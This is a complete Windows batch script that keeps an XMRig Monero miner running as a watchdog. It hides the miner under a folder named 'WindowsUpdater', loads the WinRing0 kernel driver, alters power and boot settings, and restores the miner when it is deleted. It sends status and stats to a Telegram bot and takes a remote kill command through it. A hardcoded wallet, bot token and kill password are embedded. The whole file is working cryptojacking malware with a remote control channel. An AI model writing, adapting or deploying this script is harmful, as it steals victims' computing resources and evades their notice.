@echo off
setlocal enabledelayedexpansion

:: ───────────────────────────────────────────────────────────────────────────
:: CONFIG
:: ───────────────────────────────────────────────────────────────────────────
set "MUTEX=%TEMP%\xmrig_watchdog.lock"
set "XMRIG=C:\ProgramData\WindowsUpdater\xmrig.exe"
set "BACKUP=C:\ProgramData\WindowsUpdater\backup"
set "POOL=gulf.moneroocean.stream:10128"
set "WALLET=49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
set "PASS=%COMPUTERNAME%"
set "API=16000"
set "TG_TOKEN=7895971971:AAFLygxcPbKIv31iwsbkB2YDMj-12e7_YSE"
set "TG_CHAT=8112985977"
set "THREADS=12"
set "PRIO=4"
set "HINT=90"
set "AFF=0x5555"
set "KILL_PASS=takeover123"
set "KILL_FLAG=%TEMP%\xmrig_kill.flag"
set "LOG=%TEMP%\watchdog_diag.log"
set /a STATS=0

echo [*] Watchdog start at %date% %time% > "%LOG%"

:: prevent dupes
if exist "%MUTEX%" exit /b
echo locked > "%MUTEX%"

:: system-wide tweaks
powercfg /setactive e9a42b02-d5df-448d-aa00-03f14749eb61 >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v CsEnabled /t REG_DWORD /d 0 /f >nul
bcdedit /deletevalue useplatformclock >nul

:loop

  :: self-repair if missing
  if not exist "%XMRIG%" (
    echo [!] Miner missing, restoring… >> "%LOG%"
    xcopy /Y /Q "%BACKUP%\*" "C:\ProgramData\WindowsUpdater\" >nul
    curl -s -X POST "https://api.telegram.org/bot%TG_TOKEN%/sendMessage" ^
      -d "chat_id=%TG_CHAT%" -d "text=⚠️ Miner restored via watchdog"
  )

  :: kill command?
  for /f %%i in ('
    powershell -NoProfile -Command "Invoke-RestMethod 'https://api.telegram.org/bot%TG_TOKEN%/getUpdates?offset=-1' ^| Select-String '/kill %KILL_PASS%'"
  ') do (
    echo [!] Kill cmd received >> "%LOG%"
    echo stop > "%KILL_FLAG%"
  )

  if exist "%KILL_FLAG%" (
    taskkill /F /IM xmrig.exe >nul
    del "%MUTEX%" 2>nul
    exit /b
  )

  :: MSR test & auto-fix
  "%XMRIG%" --msr-test >nul 2>&1
  if errorlevel 1 (
    echo [!] MSR failed, reloading driver… >> "%LOG%"
    sc stop WinRing0_1_2_0 >nul
    sc delete WinRing0_1_2_0 >nul
    timeout /t 1 >nul
    sc create WinRing0_1_2_0 binPath= "\??\C:\ProgramData\WindowsUpdater\winring0x64.sys" type= kernel start= demand
    sc start WinRing0_1_2_0 >nul
  )

  :: launch miner if needed
  tasklist /FI "imagename eq xmrig.exe" | find /I "xmrig.exe" >nul
  if errorlevel 1 (
    echo [*] Starting miner… >> "%LOG%"
    start /min /affinity %AFF% "" "%XMRIG%" ^
      -o %POOL% -u %WALLET% -p %PASS% -a rx/0 ^
      --donate-level=0 --randomx-1gb-pages ^
      --threads=%THREADS% --cpu-priority=%PRIO% ^
      --cpu-max-threads-hint=%HINT% ^
      --http-port=%API% --max-cpu-usage=90
    curl -s -X POST "https://api.telegram.org/bot%TG_TOKEN%/sendMessage" ^
      -d "chat_id=%TG_CHAT%" -d "text=⚠️ Miner started on %COMPUTERNAME%"
  )

  :: periodic stats
  set /a STATS+=30
  if %STATS% geq 420 (
    for /f "tokens=*" %%H in ('
      powershell -NoProfile -Command "iwr http://127.0.0.1:%API%/2/summary -UseBasicParsing"
    ') do set "HASH=%%H"
    if defined HASH (
      curl -s -X POST "https://api.telegram.org/bot%TG_TOKEN%/sendMessage" ^
        -d "chat_id=%TG_CHAT%" -d "text=💻 Stats: `!HASH!`"
    )
    set /a STATS=0
  )

  timeout /t 30 >nul
goto loop
